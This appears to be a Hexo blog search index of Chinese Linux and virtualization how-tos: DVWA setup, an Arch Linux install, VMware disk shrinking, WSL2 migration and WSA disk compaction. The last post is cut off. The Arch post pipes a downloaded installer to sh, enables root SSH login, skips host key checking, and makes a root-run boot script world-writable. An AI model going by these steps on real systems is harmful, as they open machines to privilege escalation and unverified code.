<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hello World</title>
      <link href="/ug/213953/"/>
      <url>/ug/213953/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start">#</a> Quick Start</h2><h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post">#</a> Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new "My New Post"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server">#</a> Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files">#</a> Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites">#</a> Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> helloworld </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dvwa安装指引</title>
      <link href="/ug/100353/"/>
      <url>/ug/100353/</url>
      
        <content type="html"><![CDATA[<h1 id="启动nginx"><a class="markdownIt-Anchor" href="#启动nginx">#</a> 启动 nginx</h1><h2 id="service-nginx-startcd-varwwwhtmlvim-hellohtml"><a class="markdownIt-Anchor" href="#service-nginx-startcd-varwwwhtmlvim-hellohtml">#</a> service nginx start<br>cd /var/www/html<br>vim hello.html</h2><p>Helloworld!<br>// 访问虚拟机地址。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">[root@fedora axro]# cd /usr/share/nginx/html/[root@fedora html]# git clone https://github.com/digininja/DVWA.git[root@fedora html]# cd DVWA/config[root@fedora config]# cp config.inc.php.dist config.inc.php[root@fedora config]# vi config.inc.phpmysql -u root -pcreate database DVWA;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mysql&gt; create database dvwa;<br>Query OK, 1 row affected (0.00 sec)</p><p>mysql&gt; create user dvwa@localhost identified by ‘p@ssw0rd’;<br>Query OK, 0 rows affected (0.01 sec)</p><p>mysql&gt; grant all on dvwa.* to dvwa@localhost;<br>Query OK, 0 rows affected (0.01 sec)</p><p>mysql&gt; flush privileges;<br>Query OK, 0 rows affected (0.00 sec)</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> mysql </tag>
            
            <tag> kali </tag>
            
            <tag> dvwa </tag>
            
            <tag> fedora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arch安装使用指导</title>
      <link href="/ug/140206/"/>
      <url>/ug/140206/</url>
      
        <content type="html"><![CDATA[<h1 id="前期准备"><a class="markdownIt-Anchor" href="#前期准备">#</a> 前期准备</h1><p>在创建好虚拟机后，需要打开虚拟机设置，将  <code>firmware type</code>  更改为  <code>efi</code> ，以便后续操作。</p><h1 id="检查网络设置和-ssh-连接"><a class="markdownIt-Anchor" href="#检查网络设置和-ssh-连接">#</a> 检查网络设置和 SSH 连接</h1><p>以下是检查网络设置和 SSH 连接的操作步骤：</p><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh"># 检查系统启动方式ls /sys/firmware/efi/efivars# 检查网络是否通畅ping baidu.com# 更改密码并远程连接passwd# 查看 IP 地址ip addr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="使用ssh连接"><a class="markdownIt-Anchor" href="#使用ssh连接">#</a> 使用 ssh 连接</h1><pre class="line-numbers language-cmd" data-language="cmd"><div class="caption"><span>cmd</span></div><code class="language-cmd">ssh -p 22 root@192.168.204.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="分区挂载"><a class="markdownIt-Anchor" href="#分区挂载">#</a> 分区挂载</h1><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh"># 查看已存在的硬盘lsblk# 使用cfdisk创建分区cfdisk /dev/nvme0n1# 创建如下三个Device           Start      End  Sectors  Size Type/dev/nvme0n1p1    2048  1026047  1024000  500M EFI System/dev/nvme0n1p2 1026048  9414655  8388608    4G Linux swap/dev/nvme0n1p3 9414656 83884031 74469376 35.5G Linux filesystem# 分别格式化# 格式化EFI启动分区为fat32格式mkfs.fat -F32 /dev/nvme0n1p1# 格式化根目录为xfs文件系统mkfs.xfs -f /dev/nvme0n1p3# 格式化swap文件系统mkswap /dev/nvme0n1p2swapon /dev/nvme0n1p2# 挂载# 挂载根分区到mntmount /dev/nvme0n1p3 /mnt# 新建EFI分区并挂载mkdir -p /mnt/boot/EFImount /dev/nvme0n1p1 /mnt/boot/EFI<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="安装"><a class="markdownIt-Anchor" href="#安装">#</a> 安装</h1><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh"># 使用下面命令下载并安装系统pacstrap -i /mnt base base-devel vim linux linux-firmware# 生成 fstab 文件并检查genfstab -U /mnt &gt;&gt; /mnt/etc/fstabcat /mnt/etc/fstab# 切换系统目录arch-chroot /mnt# 更改时区，设置UTCln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimehwclock --systohc --utc# 更改local并生成locale信息vim /etc/locale.gen# 找到合适的地区去掉前面的#locale-gen# 将语言信息写入locale.confecho LANG=en_GB.UTF-8 &gt; /etc/locale.conf# 配置网络vim /etc/hostname----archlinux# 直接写入自己的主机名vim /etc/hosts----127.0.0.1   localhost::1         localhost127.0.1.1   archlinux.localdomain archlinux# archlinux就是自己的主机名# 安装相关包pacman -S grub efibootmgr efivar networkmanager intel-ucode# 配置grubgrub-install /dev/sdagrub-mkconfig -o /boot/grub/grub.cfg# 激活并启用NetworkManagersystemctl enable NetworkManager# 更改密码passwd# 卸载挂载，重启exitumount /mnt/boot/EFIumount /mntreboot <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="安装后"><a class="markdownIt-Anchor" href="#安装后">#</a> 安装后</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 配置网络，再次联网# 输入nmtui 选择 “Activate a connection” 回车进入，选择你需要的网络，连接后back返回即可# 安装 opensshpacman -S opensshsystemctl enable sshdsystemctl start sshdsystemctl status sshd# 查看ipip -brief address / addr# 修改ssh配置允许root连接vim /etc/ssh/sshd_config----# 将下列的语句值改为yesPermitRootLogin yes# 重启sshsystemctl restart sshd# 使用ssh连接ssh -o StrictHostKeyChecking=no root@192.168.204.130# 更新pacman -Syuuseradd axrovi /etc/passwd---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="优化终端"><a class="markdownIt-Anchor" href="#优化终端">#</a> 优化终端</h1><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh"># 安装zsh，高亮，补全sudo pacman -S zshsudo pacman -S zsh-autosuggestionssudo pacman -S zsh-syntax-highlighting# 安装gitsudo pacman -S git# 使用以下命令配置zshautoload -Uz zsh-newuser-installzsh-newuser-install -f# 查看是否生成.zshrcls -a# 安装oh my zshsh -c "$(curl -fsSL https:#raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"# 在.zshrc中加入以下插件vim .zshrc---ZSH_THEME="dieter"alias vi=vimalias ll='ls -l'source /usr/share/zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zshsource /usr/share/zsh/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh:wq# 刷新终端source .zshrc# 安装neofetchsudo pacman -S neofetch---11:18:08 axro@axro-arch ~ neofetch                   -`                    axro@axro-arch                  .o+`                   --------------                 `ooo/                   OS: Arch Linux x86_64                `+oooo:                  Host: VMware20,1 None               `+oooooo:                 Kernel: 6.2.2-arch1-1               -+oooooo+:                Uptime: 20 mins             `/:-:++oooo+:               Packages: 182 (pacman)            `/++++/+++++++:              Shell: zsh 5.9           `/++++++++++++++:             Resolution: 1280x800          `/+++ooooooooooooo/`           Terminal: /dev/pts/0         ./ooosssso++osssssso+`          CPU: 11th Gen Intel i7-11800H (1) @ 2.304GHz        .oossssso-````/ossssss+`         GPU: 00:0f.0 VMware SVGA II Adapter       -osssssso.      :ssssssso.        Memory: 209MiB / 3883MiB      :osssssss/        osssso+++.     /ossssssss/        +ssssooo/-   `/ossssso+/:-        -:/+osssso+-  `+sso+:-`                 `.-/+oso: `++:.                           `-/+/ .`                                 `/11:21:14 axro@axro-arch ~<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="安装桌面环境"><a class="markdownIt-Anchor" href="#安装桌面环境">#</a> 安装桌面环境</h1><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh"># 安装xorg-server，xorg-xinitsudo pacman -S xorg-server xorg-xinit# 安装显卡驱动sudo pacman -S xf86-video-vesa # 这里使用的是vmware，请自行找适合自己机器的显卡驱动# 安装plasmasudo pacman -S pacman-meta konsole dolphinsudo pacman -S kde-applications-meta sddm# 启动kde plasmasudo systemctl start sddm.service# 安装字体，更改中文sudo pacman -S noto-fonts-cjk wqy-microhei# 安装火狐浏览器sudo pacman -S firefox# 使用如下命令打开和关闭网卡ifconfig ens160 down/up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="vmware安装vmwaretools-实现窗口分辨率自适应"><a class="markdownIt-Anchor" href="#vmware安装vmwaretools-实现窗口分辨率自适应">#</a> vmware 安装 vmwaretools 实现窗口分辨率自适应。</h2><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh"># 安装sudo pacman -Sy gtkmm gtkmm3 net-tools open-vm-tools xf86-video-vmware xf86-input-vmmousesudo systemctl enable vmtoolsd.servicesudo systemctl enable vmware-vmblock-fuse.servicesudo reboot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="详细请参考"><a class="markdownIt-Anchor" href="#详细请参考">#</a> 详细请参考</h3><p><a href="https://wiki.archlinuxcn.org/wiki/VMware/%E5%AE%89%E8%A3%85_Arch_Linux_%E4%B8%BA%E8%99%9A%E6%8B%9F%E6%9C%BA">wiki.archlinuxcn.org</a><br> 这里不多赘述。</p><h2 id="安装中文输入法"><a class="markdownIt-Anchor" href="#安装中文输入法">#</a> 安装中文输入法</h2><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">// 安装fcitx5sudo pacman -S fcitx5-im fcitx5-chinese-addons  fcitx5-rime fcitx5-configtool// 编辑配置文件vi /etc/environment---GTK_IM_MODULE=fcitxQT_IM_MODULE=fcitxXMODIFIERS=@im=fcitxSDL_IM_MODULE=fcitx// 重启，gnome和kde会自动配置reboot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="安装yay工具并安装linuxqq"><a class="markdownIt-Anchor" href="#安装yay工具并安装linuxqq">#</a> 安装 yay 工具并安装 linuxqq</h2><pre class="line-numbers language-zsh" data-language="zsh"><code class="language-zsh">git clone https://aur.archlinux.org/yay.gitcd yaymakepkg -si<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="编写rclocal"><a class="markdownIt-Anchor" href="#编写rclocal">#</a> 编写 rc.local</h2><pre class="line-numbers language-none"><code class="language-none">vi /usr/lib/systemd/system/rc-local.service---#/usr/lib/systemd/system/rc-local.service[Unit]Description="写下描述" [Service]Type=forkingExecStart=/etc/rc.local start #在这里你可以看到开机执行脚本的位置TimeoutSec=0StandardInput=ttyRemainAfterExit=yesSysVStartPriority=99[Install]WantedBy=multi-user.targetvi /etc/rc.local---#/bin/bashsudo pacman -Syuexit 0chmod 777 /etc/rc.localsystemctl enable rc.local.service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> arch </tag>
            
            <tag> pacman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vmwarewin7shrink</title>
      <link href="/ug/174137/"/>
      <url>/ug/174137/</url>
      
        <content type="html"><![CDATA[<p>通常在我们创建虚拟机时往往并不清楚需要多少空间，等到后期才会发现分配了很多空间实际上用不到。这时候就要想办法缩小虚拟机所占用的空间了。<br>根据我这次缩小空间的经历，我十分不推荐使用快照功能。因为这会让你虚拟机当前处在快照模式，与原来的文件关系不大（就是处理起来更麻烦了。）。<br>如果你像我一样只是用 vmware 来存放如企鹅，钉钉，腾讯会议，微信这种垃圾的话，那么可以参照我的方法。</p><h1 id="缩小空间占用"><a class="markdownIt-Anchor" href="#缩小空间占用">#</a> 缩小空间占用。</h1><h2 id="0首先查看磁盘类型"><a class="markdownIt-Anchor" href="#0首先查看磁盘类型">#</a> 0. 首先查看磁盘类型</h2><p>使用文本编辑器打开虚拟机根目录下的 xxx.vmdk 文件，查看 # Extent description 下面的内容第三块是否为 SPARSE 。不是则需要进行转换。如下图：</p><pre class="line-numbers language-none"><code class="language-none">RW 8323072 SPARSE "Windows 7 x64-cl1-s001.vmdk"RW 8323072 SPARSE "Windows 7 x64-cl1-s002.vmdk"RW 8323072 SPARSE "Windows 7 x64-cl1-s003.vmdk"RW 8323072 SPARSE "Windows 7 x64-cl1-s004.vmdk"RW 8323072 SPARSE "Windows 7 x64-cl1-s005.vmdk"RW 4521984 SPARSE "Windows 7 x64-cl1-s006.vmdk"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果你在创建虚拟机选择的是动态分配磁盘文件并拆分成多个的话这里就是 SPARSE。</p><h2 id="1确保没有快照"><a class="markdownIt-Anchor" href="#1确保没有快照">#</a> 1. 确保没有快照</h2><p>确保虚拟机内没有快照。虚拟机目录下只有一个 xxx.vmdk 以及从属的 s00x.vmdk。如果有快照没法处理，则可以执行克隆操作到其他盘进行处理。</p><h2 id="2尽可能缩小虚拟机内部所占用的空间"><a class="markdownIt-Anchor" href="#2尽可能缩小虚拟机内部所占用的空间">#</a> 2. 尽可能缩小虚拟机内部所占用的空间</h2><blockquote><p>参考<a href="https://blog.csdn.net/CoutCodes/article/details/104975783">【Win10 C 盘压缩卷问题解答】：无法将卷压缩到超出任何不可移动的文件所在点</a></p></blockquote><p>进入虚拟机，进行以下处理：</p><ul><li>关闭休眠功能 *</li><li>关闭虚拟内存并删除虚拟内存文件 *</li><li>虚拟机内进行空间整理，磁盘清理</li><li>处理其他文件</li></ul><p>注意后面带星号的处理完成所有步骤后要重新打开 (建议)，不然可能会影响性能。</p><p>此时你需要确定你缩小后的 c 盘空间大小，这也决定着后面动态磁盘缩小的操作。我确定缩小后的空间为 22GiB。</p><h2 id="3-重启到pe系统使用diskgenius缩小c盘空间"><a class="markdownIt-Anchor" href="#3-重启到pe系统使用diskgenius缩小c盘空间">#</a> 3. 重启到 pe 系统使用 Diskgenius 缩小 c 盘空间。</h2><h3 id="使用微pe制作iso文件"><a class="markdownIt-Anchor" href="#使用微pe制作iso文件">#</a> 使用微 pe 制作 iso 文件</h3><ol><li>打开</li></ol><h3 id="添加硬件cddvd设备使用创建的iso文件"><a class="markdownIt-Anchor" href="#添加硬件cddvd设备使用创建的iso文件">#</a> 添加硬件 CD/DVD 设备，使用创建的 iso 文件。</h3><h3 id="vmware设置光驱启动"><a class="markdownIt-Anchor" href="#vmware设置光驱启动">#</a> <a href="https://blog.csdn.net/syf442/article/details/5067832">VMWare 设置光驱启动</a></h3><h2 id="4-减小vmware虚拟机虚拟磁盘大小"><a class="markdownIt-Anchor" href="#4-减小vmware虚拟机虚拟磁盘大小">#</a> 4. 减小 VMware 虚拟机虚拟磁盘大小</h2><blockquote><p>此处内容来自：<a href="https://blog.csdn.net/HayPinF/article/details/108252631">减小 VMware 虚拟机虚拟磁盘大小</a></p></blockquote><p>在 VMware 里虚拟机的所有编号了的  <code>.*s001.*.vmdk</code>  片段虚拟磁盘文件是虚拟化的虚拟机最大空间（Maximum Size)，就比如我的 Win7 虚拟机的 Maximum Size 是 40GiB（1GiB=1024MiB，1GB=1000MB），虚拟机生成了  <code>.*s001~s011.vmdk</code>  共 11 个虚拟机磁盘文件 vmdk，该虚拟机的 "Windows 7 x64-cl1.vmdk" 中详实记录了这 11 个 vmdk 文件（从而进行各分片虚拟磁盘文件的按名索引）：</p><pre class="line-numbers language-none"><code class="language-none"># Extent descriptionRW 8323072 SPARSE "Windows 7 x64-cl1-s001.vmdk"RW 8323072 SPARSE "Windows 7 x64-cl1-s002.vmdk"RW 8323072 SPARSE "Windows 7 x64-cl1-s003.vmdk"RW 8323072 SPARSE "Windows 7 x64-cl1-s004.vmdk"RW 8323072 SPARSE "Windows 7 x64-cl1-s005.vmdk"RW 8323072 SPARSE "Windows 7 x64-cl1-s006.vmdk"RW 8323072 SPARSE "Windows 7 x64-cl1-s007.vmdk"RW 8323072 SPARSE "Windows 7 x64-cl1-s008.vmdk"RW 8323072 SPARSE "Windows 7 x64-cl1-s009.vmdk"RW 8323072 SPARSE "Windows 7 x64-cl1-s010.vmdk"RW 655360 SPARSE "Windows 7 x64-cl1-s011.vmdk"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>vmdk 文件的 "8323072" 数字表示簇，2 簇 = 1KiB，则这 11 个 vmdk 文件对应了 ((10×8323072)/2/1024/1024)+(655360/2/1024/1024)=10×3.96875GiB+0.3125Gib=40GiB，刚好。</p><p>我们所要做的就是通过改变这里的文件个数从而达到缩小 vmdk 磁盘大小的目的。<br>已知 40GiB 对应的簇大小为 10×8323072+655360=83886080。即一个 G 的簇大小为 2097152 (/2=1048576)。<br>我们确定一下自己压缩后的大小。就比如我要压缩到 22G，得出簇的总大小为 2097152×22=46137344，这个数可以拆为五个 8323072 加上一个 46137344-(8323072×5)=4521984。即 (8323072×5)+4521984=46137344。<br>因此上面的文件就可以改成下面这样：</p><pre class="line-numbers language-none"><code class="language-none"># Extent descriptionRW 8323072 SPARSE "Windows 7 x64-cl1-s001.vmdk"RW 8323072 SPARSE "Windows 7 x64-cl1-s002.vmdk"RW 8323072 SPARSE "Windows 7 x64-cl1-s003.vmdk"RW 8323072 SPARSE "Windows 7 x64-cl1-s004.vmdk"RW 8323072 SPARSE "Windows 7 x64-cl1-s005.vmdk"RW 4521984 SPARSE "Windows 7 x64-cl1-s006.vmdk"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>记得备份 "Windows 7 x64-cl1.vmdk"，处理完成保存即可。</p><h2 id="5重新启动虚拟机"><a class="markdownIt-Anchor" href="#5重新启动虚拟机">#</a> 5. 重新启动虚拟机</h2><p>此时你会发现虚拟机的磁盘大小已经变成 22G 了。教程结束。</p>]]></content>
      
      
      
        <tags>
            
            <tag> vmware </tag>
            
            <tag> win7 </tag>
            
            <tag> capacity </tag>
            
            <tag> shrink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSL2迁移以及空间回收。</title>
      <link href="/ug/082913/"/>
      <url>/ug/082913/</url>
      
        <content type="html"><![CDATA[<p><img src="../img/wsl2move/20221119083153.png" alt=""></p><h1 id="intro"><a class="markdownIt-Anchor" href="#intro">#</a> Intro</h1><p>如果你按照正常方式在设置里移动 wsl 的话就会发现报错，本篇文章向您介绍如何正确迁移以及回收空间。</p><h1 id="移动"><a class="markdownIt-Anchor" href="#移动">#</a> 移动</h1><p>在 Windows 的 PowerShell 中输入:</p><pre class="line-numbers language-cmd" data-language="cmd"><div class="caption"><span>cmd</span></div><code class="language-cmd">wsl --help<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到关于这个命令的使用帮助说明：</p><pre class="line-numbers language-cmd" data-language="cmd"><div class="caption"><span>cmd</span></div><code class="language-cmd">用法: wsl.exe [参数] [选项...] [命令行] 用于运行 Linux 二进制文件的参数:     如果未提供命令行，wsl.exe 将启动默认的 shell。    --exec, -e &lt;命令行&gt;        执行指定的命令而不使用默认的 Linux shell。    --        按原样传递剩余的命令行。选项:    --distribution, -d &lt;分发版&gt;        运行指定的分发。    --user, -u &lt;用户名&gt;        以指定用户身份运行。用于管理适用于 Linux 的 Windows 子系统的参数:     --export &lt;分发版&gt; &lt;文件名&gt;        将分发导出到 tar 文件。        对于标准输出，文件名可以是 -。    --import &lt;分发版&gt; &lt;安装位置&gt; &lt;文件名&gt; [选项]        将指定的 tar 文件作为新分发进行导入。        对于标准输入，文件名可以是 -。        选项:            --version &lt;版本&gt;                指定用于新分发的版本。    --list, -l [选项]        列出分发。        选项:            --all                列出所有分发，包括当前正在                安装或卸载的分发。            --running                只列出当前正在运行的分发。            --quiet, -q                只显示分发名称。            --verbose, -v                显示有关所有分发的详细信息。    --set-default, -s &lt;分发版&gt;        将分发设置为默认值。    --set-default-version &lt;版本&gt;        更改新分发的默认安装版本。    --set-version &lt;分发版&gt; &lt;版本&gt;        更改指定分发的版本。    --shutdown        立即终止所有正在运行的分发和 WSL 2 轻型工具虚拟机。    --terminate, -t &lt;分发版&gt;        终止指定的分发。    --unregister &lt;分发版&gt;        注销分发。    --help        显示用法信息。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们使用到 export 、unregister 和 import 几个选项就可以实现迁移。</p><ol><li>终止正在运行的分发或虚拟机：<pre class="line-numbers language-cmd" data-language="cmd"><div class="caption"><span>cmd</span></div><code class="language-cmd">wsl --shutdown<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>查看已安装的 wsl 名称：<pre class="line-numbers language-cmd" data-language="cmd"><div class="caption"><span>cmd</span></div><code class="language-cmd">wsl.exe --list --all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-cmd" data-language="cmd"><div class="caption"><span>cmd</span></div><code class="language-cmd">适用于 Linux 的 Windows 子系统分发:Debian (默认)kali-linuxUbuntu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li>对需要迁移的分发或虚拟机导出（我要迁移 kali-linux）：<pre class="line-numbers language-cmd" data-language="cmd"><div class="caption"><span>cmd</span></div><code class="language-cmd">wsl --export kali-linux D:\kali<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>卸载分发版或虚拟机（如果是要重装系统或换机器安装，这一步可以省略，但是要将上一步导出的文件保存好）<pre class="line-numbers language-cmd" data-language="cmd"><div class="caption"><span>cmd</span></div><code class="language-cmd">wsl --unregister kali-linux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>导入新的分发版或虚拟机：<pre class="line-numbers language-cmd" data-language="cmd"><div class="caption"><span>cmd</span></div><code class="language-cmd">wsl --import kali-linux D:\wsl\kali D:\kali<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h1 id="压缩"><a class="markdownIt-Anchor" href="#压缩">#</a> 压缩</h1><p>等待导入后你会发现移动的其实是 vhdx 文件，那么就可以对这个文件进行回收空间。</p><ol><li>以管理员身份运行 cmd，输入 diskpart 命令按回车。</li><li>使用以下命令选择你的 userdata.vhdx</li></ol><pre class="line-numbers language-cmd" data-language="cmd"><div class="caption"><span>cmd</span></div><code class="language-cmd">select vdisk file = "D:\wsl\ext4.vhdx"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果提示</p><pre class="line-numbers language-cmd" data-language="cmd"><div class="caption"><span>cmd</span></div><code class="language-cmd">DiskPart successfully selected the virtual disk file.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就说明成功了。</p><ol start="3"><li>输入  <code>compact vdisk</code>  来压缩。</li></ol><h1 id="bug"><a class="markdownIt-Anchor" href="#bug">#</a> bug</h1><pre class="line-numbers language-cmd" data-language="cmd"><div class="caption"><span>cmd</span></div><code class="language-cmd">ERROR: Wsl/Service/CreateInstance/ERROR_FILE_NOT_FOUND<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开命令行，在命令行中输入</p><pre class="line-numbers language-cmd" data-language="cmd"><div class="caption"><span>cmd</span></div><code class="language-cmd">wsl.exe --list --allwsl.exe --unregister xxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="摘抄"><a class="markdownIt-Anchor" href="#摘抄">#</a> 摘抄</h1><p><a href="https://blog.csdn.net/zhys2007/article/details/110958577">WSL2 迁移方法</a><br><a href="https://blog.csdn.net/y17854117512/article/details/119214442?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1-119214442-blog-110900591.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1-119214442-blog-110900591.pc_relevant_default&amp;utm_relevant_index=1">解决 Win10 子系统的 Ubuntu 被删除后，重新安装出现找不到系统路径</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> wsl2 </tag>
            
            <tag> Hyper-v </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过diskpart工具压缩userdata.vhdx来解决磁盘占用过多问题</title>
      <link href="/ug/204350/"/>
      <url>/ug/204350/</url>
      
        <content type="html"><![CDATA[<h1 id="intro"><a class="markdownIt-Anchor" href="#intro">#</a> Intro</h1><p>当你安装了 WSA 后随着你的使用，你会发现占用的空间越来越大。即使你把不需要的安卓程序卸载了之后，却依然满满的霸占着你的 C 盘。你只能眼睁睁地看他慢慢变大却无能为力。当然本篇文章的目的就是帮你解决这个问题。</p><h1 id="移动wsa到其他盘符"><a class="markdownIt-Anchor" href="#移动wsa到其他盘符">#</a> 移动 WSA 到其他盘符</h1><blockquote><p>你利用你聪明的头脑打开了百度并使用灵巧的双手在搜索框里输入 WSA 磁盘空间过大。很快你便看到了一种解决方式.</p></blockquote><ol><li>打开设置 - 程序 - 已安装的程序，找到 WSA<br><img src="/img/Windowssubsystemforandroidcompression/20221118205416.png" alt=""></li><li>点击后面三个点选择移动。<br>稍等一会就会帮你把 WSA 移动到对应的盘符了。</li></ol><h1 id="使用diskpart工具压缩"><a class="markdownIt-Anchor" href="#使用diskpart工具压缩">#</a> 使用 diskpart 工具压缩</h1><ol><li>以管理员身份运行 cmd，输入 diskpart 命令按回车。</li><li>使用以下命令选择你的 userdata.vhdx</li></ol><pre class="line-numbers language-cmd" data-language="cmd"><div class="caption"><span>cmd</span></div><code class="language-cmd">select vdisk file = "D:\WpSystem\S-1-5-21-3846526574-1502088438-2560978845-1001\AppData\Local\Packages\MicrosoftCorporationII.WindowsSubsystemForAndroid_8wekyb3d8bbwe\LocalCache\userdata.vhdx"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果提示</p><pre class="line-numbers language-cmd" data-language="cmd"><div class="caption"><span>cmd</span></div><code class="language-cmd">DiskPart successfully selected the virtual disk file.<span 